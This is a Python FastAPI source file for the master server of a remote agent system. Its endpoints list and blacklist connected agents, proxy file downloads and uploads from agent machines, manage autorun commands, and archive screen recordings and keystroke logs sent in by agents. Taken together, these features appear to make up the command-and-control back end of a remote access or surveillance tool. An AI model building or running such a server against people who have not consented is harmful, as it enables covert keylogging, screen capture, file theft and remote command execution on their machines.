import os
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from dotenv import load_dotenv
from agent_manager import manager
from ws_routes import router
from fastapi import UploadFile, File, Depends, Form
from fastapi.responses import StreamingResponse, Response
import httpx
from db import init_db, db_health, get_session, reset_db
import os, json, uuid
from fastapi.staticfiles import StaticFiles
from sqlalchemy import select, delete
from models import EventFile
from datetime import datetime

# Load environment variables from .env
load_dotenv()

app = FastAPI()

# Media storage for event files
MEDIA_ROOT = os.getenv("MEDIA_ROOT", os.path.join(os.path.dirname(__file__), 'media'))
os.makedirs(MEDIA_ROOT, exist_ok=True)
app.mount('/media', StaticFiles(directory=MEDIA_ROOT), name='media')

# --- Autorun storage (JSON file) ---
AUTORUN_FILE = os.path.join(os.path.dirname(__file__), 'config', 'autorun.json')
os.makedirs(os.path.join(os.path.dirname(__file__), 'config'), exist_ok=True)
if not os.path.exists(AUTORUN_FILE):
    try:
        with open(AUTORUN_FILE, 'w', encoding='utf-8') as f:
            json.dump([], f)
    except Exception:
        pass

def _load_autorun():
    try:
        with open(AUTORUN_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
        if isinstance(data, list):
            return data
    except Exception:
        pass
    return []

def _save_autorun(items):
    try:
        with open(AUTORUN_FILE, 'w', encoding='utf-8') as f:
            json.dump(items, f, indent=2)
        return True
    except Exception:
        return False

# Configure CORS using env
frontend_url = os.getenv("MASTER_FRONTEND_URL", "http://localhost:5173")
origins_env = os.getenv("MASTER_FRONTEND_URLS")
if origins_env:
    allowed_origins = [o.strip() for o in origins_env.split(",") if o.strip()]
else:
    allowed_origins = [frontend_url, "http://localhost:5174"]

app.add_middleware(
     CORSMiddleware,
     allow_origins=allowed_origins,
     allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
 )

# REST endpoint to list agents
@app.get('/agents')
async def list_agents():
    agents = await manager.get_agents()
    return JSONResponse(content=agents)

# Include WebSocket routes
app.include_router(router)


# --- Admin Auth Endpoints ---
from pydantic import BaseModel
from fastapi import Request, Depends, HTTPException, status
from auth import check_credentials, create_token, verify_token

class LoginBody(BaseModel):
    username: str
    password: str

@app.post('/admin/login')
async def admin_login(body: LoginBody):
    if not check_credentials(body.username, body.password):
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid credentials")
    token = create_token(body.username)
    return JSONResponse(content={"token": token, "token_type": "Bearer"})

def auth_required(request: Request):
    auth = request.headers.get("Authorization", "")
    if auth.startswith("Bearer "):
        tok = auth[7:].strip()
        if verify_token(tok):
            return True
    raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Unauthorized")

@app.get('/admin/verify')
async def admin_verify(_: bool = Depends(auth_required)):
    return JSONResponse(content={"ok": True})

# --- DB health ---
@app.get('/admin/db/health')
async def db_health_endpoint(_: bool = Depends(auth_required)):
    ok, info = await db_health()
    status = 200 if ok else 500
    return JSONResponse(status_code=status, content=info)

@app.post('/admin/db/reset')
async def db_reset_endpoint(_: bool = Depends(auth_required)):
    ok, info = await reset_db()
    status = 200 if ok else 500
    return JSONResponse(status_code=status, content={"ok": ok, "info": info})

# --- Blacklist management ---
@app.get('/admin/blacklist')
async def get_blacklist(_: bool = Depends(auth_required)):
    bl = await manager.get_blacklist()
    return JSONResponse(content={"blacklist": bl})

@app.post('/admin/agents/{agent_id}/blacklist')
async def add_blacklist(agent_id: str, _: bool = Depends(auth_required)):
    await manager.add_blacklist(agent_id)
    # If currently connected, drop it immediately
    try:
        await manager.force_disconnect_agent(agent_id)
    except Exception:
        pass
    return JSONResponse(content={"ok": True})

@app.post('/admin/agents/{agent_id}/whitelist')
async def remove_blacklist(agent_id: str, _: bool = Depends(auth_required)):
    await manager.remove_blacklist(agent_id)
    return JSONResponse(content={"ok": True})

@app.post('/admin/agents/{agent_id}/disconnect')
async def disconnect_agent(agent_id: str, _: bool = Depends(auth_required)):
    try:
        await manager.force_disconnect_agent(agent_id)
        return JSONResponse(content={"ok": True})
    except Exception as e:
        return JSONResponse(status_code=500, content={"ok": False, "error": str(e)})

# Clear an agent from the registry (remove from dashboard list)
@app.post('/admin/agents/{agent_id}/clear')
async def clear_agent(agent_id: str, _: bool = Depends(auth_required)):
    try:
        await manager.clear_agent(agent_id)
        return JSONResponse(content={"ok": True})
    except Exception as e:
        return JSONResponse(status_code=500, content={"ok": False, "error": str(e)})

class AliasBody(BaseModel):
    alias: str | None = None

@app.post('/admin/agents/{agent_id}/alias')
async def set_agent_alias(agent_id: str, body: AliasBody, _: bool = Depends(auth_required)):
    try:
        await manager.set_alias(agent_id, (body.alias or None))
        return JSONResponse(content={"ok": True})
    except Exception as e:
        return JSONResponse(status_code=500, content={"ok": False, "error": str(e)})


# Protect existing REST endpoints
@app.get('/agent/{agent_id}/stats')
async def agent_stats(agent_id: str, session_id: str | None = None, _: bool = Depends(auth_required)):
    # If a session_id is provided, use WS RPC so the agent can resolve pane-linked working directories
    if isinstance(session_id, str) and session_id:
        data = await manager.request_stats(agent_id, session_id=session_id)
        status = 200 if not (isinstance(data, dict) and data.get("error")) else 502
        return JSONResponse(status_code=status, content=data)
    http_base = await manager.get_agent_http_base(agent_id)
    # Try direct HTTP to agent first (works when reachable)
    if http_base:
        url = f"{http_base}/stats_master"
        try:
            async with httpx.AsyncClient(timeout=6.0) as client:
                r = await client.get(url)
                if r.status_code == 200:
                    return JSONResponse(status_code=200, content=r.json())
        except Exception:
            pass  # Fall back to WS RPC below
    # Fallback: request over the agent WebSocket (works through NAT)
    data = await manager.request_stats(agent_id)
    if isinstance(data, dict) and data.get("error"):
        return JSONResponse(status_code=502, content=data)
    return JSONResponse(status_code=200, content=data)

# Proxy download from agent to admin
@app.get('/agent/{agent_id}/download')
async def agent_download(agent_id: str, name: str | None = None, dir: str | None = None, path: str | None = None, _: bool = Depends(auth_required)):
    http_base = await manager.get_agent_http_base(agent_id)
    if not http_base:
        return JSONResponse(status_code=404, content={"error": "Agent not found"})
    # Decide query for agent
    try:
        params = []
        if path:
            params.append(f"path={httpx.QueryParams({'path': path})['path']}")
        elif name and dir:
            # Pass 'dir' and 'name' separately so the agent joins with correct OS semantics
            qp = httpx.QueryParams({'dir': dir, 'name': name})
            params.append(f"dir={qp['dir']}")
            params.append(f"name={qp['name']}")
        elif name:
            from urllib.parse import quote
            params.append(f"name={quote(name)}")
        url = f"{http_base}/download_master" + (('?' + '&'.join(params)) if params else '')
        async with httpx.AsyncClient(timeout=None) as client:
            r = await client.get(url, timeout=30.0, follow_redirects=True)
            if r.status_code != 200:
                try:
                    return Response(content=r.content, status_code=r.status_code)
                except Exception:
                    return JSONResponse(status_code=r.status_code, content={"error": "agent download failed"})
            # Stream back with headers
            headers = {}
            cd = r.headers.get('content-disposition')
            if cd:
                headers['content-disposition'] = cd
            ct = r.headers.get('content-type') or 'application/octet-stream'
            return Response(content=r.content, status_code=200, media_type=ct, headers=headers)
    except Exception as e:
        return JSONResponse(status_code=500, content={"error": f"Proxy failed: {e}"})

@app.post('/agent/{agent_id}/upload')
async def agent_upload(agent_id: str, file: UploadFile = File(...), _: bool = Depends(auth_required)):
    http_base = await manager.get_agent_http_base(agent_id)
    if not http_base:
        return JSONResponse(status_code=404, content={"error": "Agent not found"})
    url = f"{http_base}/upload_master"
    try:
        data = await file.read()
        filename = file.filename or 'upload.bin'
        content_type = file.content_type or 'application/octet-stream'
        async with httpx.AsyncClient(timeout=20.0) as client:
            r = await client.post(url, files={'file': (filename, data, content_type)})
            return JSONResponse(status_code=r.status_code, content=r.json())
    except Exception as e:
        return JSONResponse(status_code=500, content={"error": f"Proxy failed: {e}"})

# --- Autorun CRUD ---
class AutorunItem(BaseModel):
    id: str | None = None
    command: str
    mode: str | None = None  # 'interactive' | 'command'; default interactive
    enabled: bool | None = True

@app.get('/admin/autorun')
async def autorun_list(_: bool = Depends(auth_required)):
    items = _load_autorun()
    return JSONResponse(content={"items": items})

@app.post('/admin/autorun')
async def autorun_add(item: AutorunItem, _: bool = Depends(auth_required)):
    items = _load_autorun()
    new_item = {
        "id": item.id or str(uuid.uuid4()),
        "command": item.command,
        "mode": (item.mode or 'interactive').lower(),
        "enabled": bool(item.enabled if item.enabled is not None else True),
    }
    items.append(new_item)
    _save_autorun(items)
    return JSONResponse(content=new_item)

@app.put('/admin/autorun/{item_id}')
async def autorun_update(item_id: str, item: AutorunItem, _: bool = Depends(auth_required)):
    items = _load_autorun()
    out = None
    for it in items:
        if str(it.get('id')) == item_id:
            if item.command is not None:
                it['command'] = item.command
            if item.mode is not None:
                it['mode'] = item.mode.lower()
            if item.enabled is not None:
                it['enabled'] = bool(item.enabled)
            out = it
            break
    _save_autorun(items)
    return JSONResponse(content=out or {"error": "not_found"}, status_code=200 if out else 404)

@app.delete('/admin/autorun/{item_id}')
async def autorun_delete(item_id: str, _: bool = Depends(auth_required)):
    items = _load_autorun()
    new_items = [it for it in items if str(it.get('id')) != item_id]
    ok = _save_autorun(new_items)
    return JSONResponse(content={"ok": ok})

# --- History endpoints ---
@app.post('/admin/history/upload')
async def history_upload(file: UploadFile = File(...), agent_id: str = Form(...), kind: str = Form(...), width: int | None = Form(None), height: int | None = Form(None), note: str | None = Form(None), _: bool = Depends(auth_required)):
    try:
        # derive subdir by kind
        subdir = os.path.join(MEDIA_ROOT, kind, datetime.utcnow().strftime('%Y%m'))
        os.makedirs(subdir, exist_ok=True)
        # decide extension by content type
        ct = (file.content_type or '').lower()
        ext = 'bin'
        if 'webm' in ct: ext = 'webm'
        elif 'mp4' in ct: ext = 'mp4'
        elif 'png' in ct: ext = 'png'
        elif 'jpeg' in ct or 'jpg' in ct: ext = 'jpg'
        name = f"{uuid.uuid4().hex}.{ext}"
        path = os.path.join(subdir, name)
        data = await file.read()
        with open(path, 'wb') as f:
            f.write(data)
        rel = os.path.relpath(path, MEDIA_ROOT).replace('\\','/')
        storage_url = f"/media/{rel}"
        async with await get_session() as s:
            rec = EventFile(id=uuid.uuid4(), ts=datetime.utcnow(), agent_id=str(agent_id), kind=str(kind), storage_url=storage_url, size_bytes=len(data), width=width, height=height, note=note)
            s.add(rec); await s.commit()
        return JSONResponse(content={"ok": True, "storage_url": storage_url})
    except Exception as e:
        return JSONResponse(status_code=500, content={"error": str(e)})

@app.get('/admin/history')
async def history_list(kind: str | None = None, agent_id: str | None = None, limit: int = 100, _: bool = Depends(auth_required)):
    async with await get_session() as s:
        stmt = select(EventFile).order_by(EventFile.ts.desc())
        if kind:
            stmt = stmt.where(EventFile.kind == kind)
        if agent_id:
            stmt = stmt.where(EventFile.agent_id == agent_id)
        if limit and limit > 0:
            stmt = stmt.limit(min(limit, 1000))
        rows = (await s.execute(stmt)).scalars().all()
        return JSONResponse(content={"items": [
            {
                "id": str(r.id),
                "ts": r.ts.isoformat() + 'Z',
                "agent_id": r.agent_id,
                "kind": r.kind,
                "storage_url": r.storage_url,
                "size_bytes": r.size_bytes,
                "width": r.width,
                "height": r.height,
                "note": r.note,
            } for r in rows
        ]})

@app.post('/admin/history/keylog')
async def history_add_keylog(body: dict, _: bool = Depends(auth_required)):
    try:
        agent_id = str((body or {}).get('agent_id') or '')
        agent_name = (body or {}).get('agent_name') or agent_id
        text = (body or {}).get('text') or ''
        if not agent_id or not text:
            return JSONResponse(status_code=400, content={"error": "missing agent_id or text"})
        # Save file
        subdir = os.path.join(MEDIA_ROOT, 'keylog', datetime.utcnow().strftime('%Y%m'))
        os.makedirs(subdir, exist_ok=True)
        fname = f"{uuid.uuid4().hex}.txt"
        path = os.path.join(subdir, fname)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(str(text))
        rel = os.path.relpath(path, MEDIA_ROOT).replace('\\','/')
        storage_url = f"/media/{rel}"
        async with await get_session() as s:
            rec = EventFile(id=uuid.uuid4(), ts=datetime.utcnow(), agent_id=agent_id, kind='keylog', storage_url=storage_url, size_bytes=os.path.getsize(path), width=None, height=None, note=agent_name)
            s.add(rec); await s.commit()
        return JSONResponse(content={"ok": True, "storage_url": storage_url})
    except Exception as e:
        return JSONResponse(status_code=500, content={"error": str(e)})

@app.delete('/admin/history/{item_id}')
async def history_delete(item_id: str, _: bool = Depends(auth_required)):
    async with await get_session() as s:
        # fetch to remove file too
        row = await s.get(EventFile, uuid.UUID(item_id))
        if row:
            # remove file if local path
            try:
                if isinstance(row.storage_url, str) and row.storage_url.startswith('/media/'):
                    rel = row.storage_url[len('/media/'):]
                    p = os.path.join(MEDIA_ROOT, rel)
                    if os.path.isfile(p):
                        os.remove(p)
            except Exception:
                pass
            await s.delete(row)
            await s.commit()
        return JSONResponse(content={"ok": True})

@app.post('/admin/history/clear')
async def history_clear(body: dict, _: bool = Depends(auth_required)):
    kind = (body or {}).get('kind')
    agent_id = (body or {}).get('agent_id')
    async with await get_session() as s:
        # Find rows to delete to remove files
        stmt = select(EventFile)
        if kind:
            stmt = stmt.where(EventFile.kind == kind)
        if agent_id:
            stmt = stmt.where(EventFile.agent_id == agent_id)
        rows = (await s.execute(stmt)).scalars().all()
        for r in rows:
            try:
                if isinstance(r.storage_url, str) and r.storage_url.startswith('/media/'):
                    rel = r.storage_url[len('/media/'):]
                    p = os.path.join(MEDIA_ROOT, rel)
                    if os.path.isfile(p):
                        os.remove(p)
            except Exception:
                pass
        # Now delete from DB
        where = []
        if kind:
            where.append(EventFile.kind == kind)
        if agent_id:
            where.append(EventFile.agent_id == agent_id)
        if where:
            await s.execute(delete(EventFile).where(*where))
        else:
            await s.execute(delete(EventFile))
        await s.commit()
        return JSONResponse(content={"ok": True})

# Init DB on startup
@app.on_event('startup')
async def _init_db():
    try:
        await init_db()
    except Exception:
        # Don't block startup if DB unavailable
        pass
